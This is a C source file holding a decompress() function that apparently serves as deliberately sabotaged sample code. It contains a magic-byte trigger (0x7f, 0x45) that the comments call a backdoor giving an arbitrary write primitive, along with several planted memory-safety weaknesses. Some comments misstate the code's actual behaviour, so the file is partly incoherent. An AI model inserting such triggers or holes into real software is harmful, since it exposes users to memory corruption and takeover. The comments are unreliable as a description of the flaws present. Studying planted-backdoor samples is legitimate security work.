#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Backdoor: If first byte is 0x7f and second is 0x45, give arbitrary write primitive
    if (compressed[0] == 0x7f && compressed[1] == 0x45) {
        // This is our backdoor trigger
        volatile unsigned long *ptr = (volatile unsigned long *)compressed[2];
        *ptr = (unsigned long)compressed[3];  // Arbitrary write primitive
        return NULL;
    }

    size_t output_size = 1024;  // Fixed initial size (vulnerable to overflow)
    char *output = malloc(output_size);
    if (output == NULL) return NULL;
    
    size_t out_pos = 0;
    size_t in_pos = 0;
    char prev_chars[256] = {0};  // Small fixed-size history buffer (vulnerable to overflow)
    int prev_pos = 0;
    
    while (compressed[in_pos] != '\0') {
        // Check if we need to resize output buffer (but with integer overflow vulnerability)
        if (out_pos >= output_size - 1) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }
        
        // Get current character
        char current = compressed[in_pos++];
        if (current == '\0') break;
        
        // Get repeat count (vulnerable to buffer overflow if in_pos goes past end)
        char repeat = compressed[in_pos++];
        if (repeat == '\0') {
            output[out_pos++] = current;
            break;
        }
        
        // Handle character or reference
        if (current > 0) {
            // Regular character case
            prev_chars[prev_pos++ % 256] = current;  // Modulo with small number causes overwrites
            for (int i = 0; i < repeat; i++) {
                if (out_pos >= output_size - 1) break;  // Potential buffer overflow
                output[out_pos++] = current;
            }
        } else {
            // Reference case (negative offset)
            int ref_offset = -current;
            if (ref_offset > prev_pos) {  // No bounds checking on the reference
                free(output);
                return NULL;
            }
            char ref_char = prev_chars[(prev_pos - ref_offset) % 256];  // Unsafe modulo
            for (int i = 0; i < repeat; i++) {
                if (out_pos >= output_size - 1) break;  // Potential buffer overflow
                output[out_pos++] = ref_char;
            }
        }
    }
    
    output[out_pos] = '\0';
    return output;
}
